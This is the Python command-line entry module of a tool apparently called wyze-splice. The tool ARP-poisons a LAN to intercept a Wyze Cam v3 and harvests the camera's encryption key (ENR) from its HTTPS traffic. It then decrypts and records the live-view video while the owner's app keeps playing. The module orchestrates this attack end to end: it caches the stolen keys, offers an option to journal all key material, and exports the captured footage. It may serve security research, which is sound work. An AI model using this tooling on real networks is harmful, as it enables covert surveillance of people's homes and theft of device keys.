"""wyze-splice: decrypt a Wyze Cam v3 live view while the app keeps playing.

  sudo wyze-splice run --target 192.168.1.20
  wyze-splice extract captures/<run>/av.bin
"""
import argparse
import atexit
import json
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

STATE_DIR = Path(os.environ.get("WYZE_SPLICE_STATE", "/var/lib/wyze-splice"))


def _sigterm(signum, frame):
    raise KeyboardInterrupt


def _inhibit_sleep():
    """A suspended host black-holes the camera while it is the camera's
    gateway; hold a sleep inhibitor for the run."""
    exe = shutil.which("systemd-inhibit")
    if not exe:
        return
    p = subprocess.Popen([exe, "--what=sleep:idle:handle-lid-switch",
                          "--who=wyze-splice", "--why=camera gateway",
                          "sleep", "infinity"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    atexit.register(p.terminate)


def _cached_enr(target):
    try:
        return json.loads((STATE_DIR / "enr.json").read_text()).get(target)
    except (OSError, ValueError):
        return None


def _cache_enr(target, enr, mac):
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    path = STATE_DIR / "enr.json"
    try:
        d = json.loads(path.read_text())
    except (OSError, ValueError):
        d = {}
    d[target] = {"enr": enr, "mac": mac, "seen": int(time.time())}
    path.write_text(json.dumps(d, indent=1) + "\n")
    os.chmod(path, 0o600)


def _harvest(target, us, timeout):
    from .enr import Harvester
    h = Harvester(target, us)
    h.start()
    print("[*] waiting for the camera's ENR: it sends it to api.wyzecam.com "
          "at boot, on motion alarms, and every few hours")
    try:
        deadline = time.time() + timeout if timeout else None
        while not h.found.wait(5):
            if deadline and time.time() > deadline:
                return None
    finally:
        h.stop()
    print(f"[+] ENR harvested from the camera's HTTPS (mac {h.mac})")
    return h.enr, h.mac


def _give_to_user(path):
    """Under sudo, hand the capture directory back to the invoking user."""
    uid, gid = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if not uid:
        return
    for root, dirs, files in os.walk(path):
        for n in [root, *(os.path.join(root, f) for f in dirs + files)]:
            os.chown(n, int(uid), int(gid))


def cmd_run(a):
    if os.geteuid() != 0:
        sys.exit("run needs root (ARP, iptables, transparent sockets)")
    from .netutil import ensure_conntrack, iface_for, local_ip_for
    from .onpath import OnPath
    from .splice import Splicer

    signal.signal(signal.SIGTERM, _sigterm)
    out = Path(a.out or f"captures/{time.strftime('%Y%m%d-%H%M%S')}")
    out.mkdir(parents=True, exist_ok=True)
    us = local_ip_for("8.8.8.8")   # the address we NAT the camera to
    ensure_conntrack()
    _inhibit_sleep()
    onpath = OnPath(a.target, iface_for(a.target), poison=not a.on_path)
    atexit.register(onpath.close)
    spliced = 0
    try:
        onpath.start()
        enr = a.enr
        if not enr:
            c = _cached_enr(a.target)
            if c and not a.reharvest:
                enr = c["enr"]
                print(f"[*] using the cached ENR for {a.target} "
                      f"({STATE_DIR / 'enr.json'})")
        if not enr:
            got = _harvest(a.target, us, a.harvest_timeout)
            if not got:
                sys.exit("no ENR seen; pass --enr, or retry later")
            enr = got[0]
            _cache_enr(a.target, *got)
        splicer = Splicer(a.target, enr, us, out,
                          pass_through=a.pass_through, journal=a.journal)
        spliced = splicer.run(sessions=None if a.keep_going else 1)
    except KeyboardInterrupt:
        pass
    finally:
        onpath.close()
    av = out / "av.bin"
    if spliced and av.exists() and not a.no_video:
        _export(av, out)
    _give_to_user(out)
    print(f"[+] {spliced} session(s) spliced; output in {out}/")
    return 0 if spliced else 1


def _export(av, outdir):
    from .media import export
    try:
        r = export(str(av), str(outdir))
    except Exception as e:  # noqa: BLE001
        print(f"[!] video export failed ({e}); "
              f"retry with: wyze-splice extract {av}")
        return
    if not r["frames"]:
        print("[!] no decodable video in av.bin")
        return
    print(f"[+] video: {r['frames']} frames over {r['seconds']:.1f}s")
    for m in r["mp4s"]:
        size = f"{m['size'][0]}x{m['size'][1]}" if m["size"] else "?"
        print(f"    {m['path']}: {size}, {m['frames']} frames, "
              f"{m['seconds']:.1f}s")
    if r["dropped"]:
        print(f"    ({r['dropped']} frames dropped: incomplete, or after an "
              f"incomplete I-frame; the camera stops completing I-frames "
              f"once the viewer leaves)")


def cmd_extract(a):
    av = Path(a.av_bin)
    _export(av, Path(a.outdir) if a.outdir else av.parent)
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(prog="wyze-splice", description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    r = sub.add_parser("run", help="get on-path, splice the next live view, "
                                   "write the video")
    r.add_argument("--target", required=True, help="camera IPv4 on this LAN")
    r.add_argument("--enr", help="camera ENR (default: harvest it, then "
                                 "reuse the cached one)")
    r.add_argument("--reharvest", action="store_true",
                   help="ignore the cached ENR")
    r.add_argument("--harvest-timeout", type=int, default=0,
                   help="give up harvesting after this many seconds "
                        "(default: wait)")
    r.add_argument("--out", help="output directory (default captures/<time>)")
    r.add_argument("--on-path", action="store_true",
                   help="this host already routes the camera (gateway, "
                        "lab): skip ARP poisoning")
    r.add_argument("--keep-going", action="store_true",
                   help="splice every session until Ctrl-C, not just the first")
    r.add_argument("--pass-through", action="store_true",
                   help="divert but forward verbatim (A/B control)")
    r.add_argument("--journal", action="store_true",
                   help="also write journal.jsonl with all key material")
    r.add_argument("--no-video", action="store_true",
                   help="skip the MP4 export at the end")
    r.set_defaults(fn=cmd_run)
    e = sub.add_parser("extract", help="av.bin -> video.mp4 + frame.jpg")
    e.add_argument("av_bin")
    e.add_argument("outdir", nargs="?")
    e.set_defaults(fn=cmd_extract)
    a = ap.parse_args(argv)
    return a.fn(a)


if __name__ == "__main__":
    sys.exit(main())
